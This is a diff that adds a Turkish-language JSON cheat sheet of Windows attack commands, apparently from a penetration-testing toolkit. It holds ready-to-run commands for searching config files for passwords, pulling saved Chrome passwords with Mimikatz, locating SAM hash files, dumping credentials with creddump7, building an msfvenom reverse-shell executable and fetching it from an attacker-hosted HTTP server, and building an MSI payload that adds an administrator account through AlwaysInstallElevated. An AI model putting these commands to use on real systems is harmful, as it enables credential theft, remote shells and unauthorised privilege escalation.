@@ -1,0 +1,116 @@
+{
+  "accesschk64": {
+    "desc": "Windows kaynaklarına erişim izinlerini denetler",
+    "category": "Security Audit",
+    "usage": ".\\accesschk64.exe [options] [user] [resource]",
+    "examples": [
+      ".\\accesschk64.exe -uwcqv <KULLANICI> * /accepteula",
+      ".\\accesschk64.exe -ucqv <SERVICE> /accepteula",
+      ".\\accesschk64.exe -uwcqv user *"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "Kullanıcı ve grup izin detayları",
+    "type": "Security Tool",
+    "risk_level": "Medium",
+    "tool": "Sysinternals",
+    "parameters": {
+      "-u": "Kullanıcı hakları göster",
+      "-w": "Yazma izinleri göster", 
+      "-c": "Servis kontrol izinleri göster",
+      "-q": "Sessiz mod",
+      "-v": "Detaylı çıktı"
+    }
+  },
+  "password_search_in_conf": {
+    "desc": "Dosyalarda 'password' kelimesini arayıp .conf uzantılı olanları filtreler",
+    "category": "Information Gathering",
+    "usage": "Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Select-String 'password' -List | select path | where path -like '*.conf'",
+    "examples": [
+      "cd 'C:\\Program Files'",
+      "Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Select-String 'password' -List | select path | where path -like '*.conf'"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "Password içeren .conf dosyalarının yolları",
+    "type": "PowerShell Command",
+    "risk_level": "Medium",
+    "security": "Hassas bilgi arama"
+  },
+  "mimikatz_chrome": {
+    "desc": "Mimikatz ile Chrome tarayıcısından şifreleri çıkarır",
+    "category": "Credential Extraction",
+    "usage": "dpapi::chrome /in:\"path\" /masterkey:<MASTERKEY>",
+    "examples": [
+      "dpapi::chrome /in:\"C:\\Users\\<USER>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /masterkey:<MASTERKEY>"
+    ],
+    "target_os": "Windows",
+    "requires_admin": true,
+    "output": "Chrome'da saklanan kullanıcı adları ve şifreler",
+    "type": "Credential Tool",
+    "risk_level": "High",
+    "tool": "Mimikatz",
+    "security": "Kritik güvenlik aracı"
+  },
+  "sam_file_locations": {
+    "desc": "Windows SAM dosyasının farklı konumları",
+    "category": "System Files",
+    "usage": "SAM dosya yolları",
+    "examples": [
+      "C:\\Windows\\repair\\SAM",
+      "C:\\Windows\\System32\\config\\RegBack\\SAM", 
+      "C:\\Windows\\System32\\config\\SAM"
+    ],
+    "target_os": "Windows",
+    "requires_admin": true,
+    "output": "SAM dosya yolları",
+    "type": "File Path",
+    "risk_level": "High",
+    "note": "SAM dosyası Windows tarafından kilitlenir, sistem kapalıyken erişilebilir",
+    "security": "Kritik sistem dosyası"
+  },
+  "creddump7": {
+    "desc": "Windows sistemlerinde güvenlik bilgilerini ve kimlik bilgilerini çıkarmak için kullanılan araç",
+    "category": "Credential Extraction",
+    "usage": "creddump7 [options]",
+    "target_os": "Windows",
+    "requires_admin": true,
+    "output": "Hash'ler ve parola bilgileri",
+    "type": "Security Tool",
+    "risk_level": "High",
+    "security": "Pass-the-hash saldırıları için kullanılabilir"
+  },
+  "msfvenom_reverse_shell": {
+    "desc": "Reverse shell oluşturmak için msfvenom kullanımı",
+    "category": "Payload Generation",
+    "usage": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o filename.exe",
+    "examples": [
+      "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP ADDRESI> LPORT=4343 -f exe -o reverse.exe",
+      "python -m http.server",
+      "Invoke-WebRequest -Uri 'http://<IP ADDRESI>:8000/reverse.exe' -OutFile .\\Desktop\\reverse.exe"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "Reverse shell executable dosyası",
+    "type": "Payload Tool",
+    "risk_level": "High",
+    "tool": "Metasploit Framework"
+  },
+  "msfvenom_msi_payload": {
+    "desc": "AlwaysInstallElevated için MSI payload oluşturur",
+    "category": "Privilege Escalation",
+    "usage": "msfvenom -p windows/adduser USER=username PASS='password' -f msi -o filename.msi",
+    "examples": [
+      "msfvenom -p windows/adduser USER=newadmin PASS='Password123!' -f msi -o newadmin.msi",
+      "python -m http.server",
+      "Invoke-WebRequest -Uri 'http://<IP>:8000/newadmin.msi' -OutFile .\\Desktop\\newadmin.msi"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "Yeni admin kullanıcı oluşturan MSI dosyası",
+    "type": "Payload Tool",
+    "risk_level": "High",
+    "tool": "Metasploit Framework",
+    "note": "AlwaysInstallElevated ayarı aktif olmalı"
+  }
+}
